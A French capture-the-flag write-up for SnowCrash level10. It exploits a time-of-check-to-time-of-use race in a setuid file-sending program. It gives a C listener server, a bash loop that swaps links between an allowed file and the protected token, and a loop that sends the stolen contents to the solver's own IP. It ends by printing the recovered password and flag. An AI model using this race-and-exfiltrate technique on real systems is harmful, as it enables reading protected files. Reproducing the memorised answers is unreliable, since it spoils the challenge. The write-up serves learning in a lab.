# Level10 - Time of Check to Time of Update Race
Pour résoudre le level10, on a un fichier level10 et un fichier token. level10 utilise un socket pour transmettre le contenu d'un fichier vers le port 6969 de l'IP indiquée en paramètres.

```
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
```

Pour que l'on puisse exploiter ce programme, on va avoir besoin de créer un programme serveur qui va écouter sur le port 6969 de notre VM de travail, et qui va récupérer la data qu'envoie le client depuis la VM SnowCrash.

```
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h> /* close */
#include <netdb.h> /* gethostbyname */
#include <errno.h>
#include <stdio.h>

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket(s) close(s)
#define PORT 6969

typedef int SOCKET;
typedef struct sockaddr_in SOCKADDR_IN;
typedef struct sockaddr SOCKADDR;
typedef struct in_addr IN_ADDR;

int main ()
{
        char buff[2048];
        //Creation du socket
        SOCKET ssocket = socket(AF_INET, SOCK_STREAM, 0);
        if (ssocket == INVALID_SOCKET)
        {
                perror("socket()");
                exit(errno);
        }

        //Creation de l'interface d'ecoute du socket
        SOCKADDR_IN sin = { 0 };

        sin.sin_addr.s_addr = htonl(INADDR_ANY);
        sin.sin_family = AF_INET;
        sin.sin_port = htons(PORT);

        if (bind(ssocket, (SOCKADDR *)&sin, sizeof(sin)) == SOCKET_ERROR)
        {
                perror("bind()");
                exit(errno);
        }

        //Linitation du nombre de connections
        if (listen(ssocket, 5) == SOCKET_ERROR)
        {
                perror("listen()");
                exit(errno);
        }


        SOCKET client_socket;
        while(1)
        {
                SOCKADDR_IN client_sin = { 0 };
                socklen_t clientLength = sizeof(client_sin);
                client_socket = accept(ssocket, (SOCKADDR *)&client_sin, &clientLength);
                if (client_socket == INVALID_SOCKET)
                {
                        perror("accept()");
                        exit(errno);
                }

                //Reception des datas
                int n = 0;
                bzero((void*)buff, sizeof(buff));
                while ((n = recv(client_socket, buff, sizeof(buff) - 2, 0) > 0))
                {
                        printf("%s\0\n", buff);
                        bzero((void*)buff, sizeof(buff));
                }
        }
        closesocket(ssocket);
        closesocket(client_socket);
}
```

On essaie d'envoyer un fichier simple avec `level10`, on reçoit bien son contenu sur notre serveur.
Malheureusement, nous n'avons pas les droits sur token, et une vérification de ces derniers semblent etre effectuée avant l'envoi du fichier.

```
-- COTÉ CLIENT --

level10@SnowCrash:~$ ./level10 /tmp/toto 192.168.56.106
Connecting to 192.168.56.106:6969 .. Connected!
Sending file .. wrote file!

level10@SnowCrash:~$ ./level10 token 192.168.56.106
You don't have access to token

-- COTÉ SERVEUR --

.*( )*.
toto
```

En regardant les `strings` du programme, on s'aperçoit que ce dernier utilise la fonction `access`. Un tour sur le man et on peut y lire:
> Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.

On est donc face à un cas de `Time of Check to Time of Update Race`, c'est à dire qu'entre le moment où l'on va vérifier si on a accès au fichier qu'on tente d'envoyer et le moment où on va l'ouvrir pour récupérer son contenu, il faut pourvoir tromper le programme pour lui faire ouvrir notre fichier `token`.

#### Pour cela, on crée deux scripts:

Le premier va venir créer un lien symbolique vers un fichier auquel on a accès, puis va supprimer ce lien et le remplacer par un lien vers notre token. Les deux liens auront le même nom et le même path, ce qui fera croire au programme qu'il ouvre bien le bon fichier.

```
#!/bin/bash
while :
do
        rm -f /tmp/faketoken
        ln /home/user/level10/level10 /tmp/faketoken
        rm -f /tmp/faketoken
        ln /home/user/level10/token /tmp/faketoken
done
```

Le deuxième va simplement envoyer en boucle notre lien au programme `level10`
```
#!/bin/bash
while :
do
/home/user/level10/level10 /tmp/faketoken 192.168.56.106
done
```

On lance notre serveur, et on exécute les deux scripts. Au bout de quelques secondes, on reçoit le contenu de `token` sur notre serveur.

```
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
...
```

On se connecte sur le compte flag10 et on obtient notre token:

```
level10@SnowCrash:/tmp$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

On a notre token: `feulo4b72j7edeahuete3no7c`

